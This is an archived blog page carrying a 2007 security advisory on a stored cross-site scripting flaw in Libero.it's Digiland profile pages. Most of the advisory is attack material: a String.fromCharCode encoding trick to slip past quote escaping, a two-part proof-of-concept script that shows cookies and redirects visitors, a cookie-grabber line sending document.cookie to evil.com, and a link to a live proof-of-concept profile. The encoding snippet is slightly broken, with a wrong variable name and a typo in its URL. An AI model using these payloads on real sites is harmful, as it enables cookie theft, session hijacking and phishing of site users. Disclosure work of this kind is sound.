<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
  <head>
    <script type="text/javascript">var _sf_startpt=(new Date()).getTime()</script>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type" />
    <meta content="en-us" http-equiv="Content-Language" />
    <meta content="The online writing of Alex Payne" name="description" />
    <link href="/favicon.ico" rel="shortcut icon" type="image/x-icon" />
    <link href="/css/screen.css" media="screen, projection" rel="stylesheet" type="text/css" />
    <link rel="alternate" type="application/atom+xml" title="Alex Payne - Atom" href="/atom.xml" />
    <link href="http://www.clickpass.com/openid_server" rel="openid.server" />
    <link href="http://clickpass.com/public/al3x" rel="openid.delegate" />
    <title>Alex Payne &mdash; Advisory: Libero.it XSS Vulnerability</title>
    <script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-18477555-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>

  </head>
  <body>
    <header>
      <h1 id="title">
        <a href="/about.html" title="About">Alex Payne</a> writes online <a href="/" title="Home">here</a>.
      </h1>
      <h2 id="subtitle">
        See also the <a href="/archive.html" title="Archive">archive</a>,
        <a href="/books_talks.html">books & talks</a>.
      </h2>
    </header>
    <div id="fusionad">
  <small>advertisement</small>
  <script type='text/javascript'><!--//<![CDATA[
     var m3_u = (location.protocol=='https:'?'https://adn.fusionads.net/www/pull/get.php':'http://adn.fusionads.net/www/pull/get.php');
     var m3_r = Math.floor(Math.random()*99999999999);
     if (!document.MAX_used) document.MAX_used = ',';
     document.write ("<scr"+"ipt type='text/javascript' src='"+m3_u);
     document.write ("?zoneid=38&amp;charset=UTF-8&amp;withtext=1");
     document.write ('&amp;cb=' + m3_r);
     if (document.MAX_used != ',') document.write ("&amp;exclude=" + document.MAX_used);
     document.write ('&amp;charset=UTF-8');
     document.write ("&amp;loc=" + escape(window.location));
     if (document.referrer) document.write ("&amp;referer=" + escape(document.referrer));
     if (document.context) document.write ("&context=" + escape(document.context));
     if (document.mmm_fo) document.write ("&amp;mmm_fo=1");
     document.write ("'><\/scr"+"ipt>");
  //]]>--></script>
  <br />
  <a href="http://fusionads.net" title="Powered by Fusion Ads">POWERED by FUSION</a>
</div>
    <div id="wrapper">
      <h2 id="intro">An individual post follows.</h2>
<article class="post">
After the report of Rosario Valotta on this ML, another XSS vulnerability
has been found on Libero.it, one of the most important italian ISP
(www.libero.it).

Nothing more than a trivial error but, since Libero.it staff used the
printed media to inform that it was only a "spot" issue, it is
important to demonstrate that this kind of errors are quite more
widespread and to let the Libero staff and management realize that a
potential attack
must be avoid by a deep check of the portal.

The vulnerability once again can be found in the "Community" section
of Libero portal, and the affected functionality is the profile
creation and retrival
<http://digiland.libero.it/profilo.phtml?nick=XssForFun&top=1>.

The implementation of this functionality allows the injection of
malicious code in the profile, so that an attacker by visiting his/her
profile can:

1) steal username
2) steal cookies
3) arbitrary redirection for Phishing pourpose

The normal URL would be something linke this:

<pre>
http://digiland.libero.it/profilo.phtml?nick=Nick&top=1
</pre>

where "Nick" is the name of the nick whose profile has been
manipulated to add arbitrary code.

This vulnerability resemble to those in MySpace and other communities.
So it's nothing really complicated and you can skip on from here ;)

In admin pages (need to be logged by creating a fake account) on page

<pre>
http://digiland.libero.it/profilo_add.php?nocache=1175076655
</pre>

there are two different fields named "I miei difetti:" (my defects)
and "i miei pregi:" (my strong points) that accept arbitrary content.

As stated by Rosario, the Libero.it web application performs a simple
parsing of the posted content, so that quote and double-quote (' and ")
chars are escaped by putting a \ before of them (both using ASCII and URL
encoding).

While I already had the Rosario's beautiful implementation of a simple
evasion technique I preferred to encode the single char in an old
snippet of mine.
The aim of the snippet (I don't remember if I made it, stole it, stole
only the main idea or where, sorry)  is to transform a string into a
series of char numbers to be used with a String.fromCharCode command.
Due to the limitation in size, the function which create the
String.fromCharCode sequence is a detached and ascii value is
decreased of 100 to limit the number of digits.
This is the creation snippet:

<pre>
 &lt;script>
 var toBenc = "hettp://www.lastknight.com";
 var result = "";

  for (var k = 0; k < carlo.length; k++)
 {
         result += ("e(" + (toBenc .charCodeAt(k) - 100) + ")+");
 }

 document.write(result + "<br>")
 &lt;/script>
</pre>  

 So URL "http://www.lastknight.com" is rendered as:
 <pre>
e(4)+e(16)+e(16)+e(12)+e(-42)+e(-53)+e(-53)+e(19)+e(19)+
e(19)+e(-54)+e(8)+e(-3)+e(15)+e(16)+e(7)+e(10)+e(5)+e(3)+
e(4)+e(16)+e(-54)+e(-1)+e(11)+e(9);
</code>

Using the tho box we can use the following code for a POC:

<pre>
[BOX 1]
 &lt;script>
 function e(A) {
  return String.fromCharCode(A + 100)
 }
 alert(document.cookie);
  &lt;/script>

 [BOX 2]
 &lt;script>
 var k =
 e(4)+e(16)+e(16)+e(12)+e(-42)+e(-53)+e(-53)+e(19)+e(19)+e(19)+e(-54)+e(8);
 k +=
 e(-3)+e(15)+e(16)+e(7)+e(10)+e(5)+e(3)+e(4)+e(16)+e(-54)+e(-1)+e(11)+e(9);
 alert(k);
 window.location = k;
  &lt;/script>
</pre>
  

The posting url can be easily modified to an http grabber such as:  

<pre>
http://evil.com/grab?c="+encodeURI(document.cookie);
</pre>

or (much more dangerous) to a phishing site.  
  
Session Riding and derived problems have not been tested.  
  
A POC url is available (until not deleted) here:

[http://digiland.libero.it/profilo.phtml?nick=XssForFun&top=1]  
  
Just my 2 cents and thanks to:    
  
**M1Sec**: for hints and Support  
**Rosario Valotta**:  for the first report, upon which this is based  
**SharDick**:  for help in JS ;)  
**Vokda**:  for consultancy and typo-killing ;)  
 

<time class="signoff" datetime="2007-03-28">
  &mdash;Mar 28, 2007
</time>
</article>

      <footer id="footer">
        <a href="/" title="Home">Home</a> &bull;
        <a href="/about.html" title="About the author and site">About</a> &bull;
        <a href="/archive.html" title="Archived writing">Archive</a> &bull;
        <a href="/books_talks.html" title="Books and talks">Books & Talks</a>
        <form action="http://www.google.com/cse" id="cse-search-box">
          <div>
            <input type="hidden" name="cx" value="000652178004161548235:gnplrkdmhbu" />
            <input type="hidden" name="ie" value="UTF-8" />
            <input type="text" name="q" size="40" />
            <input type="submit" name="sa" value="Search" />
          </div>
        </form>
      </footer>
    </div>
  </body>
</html>
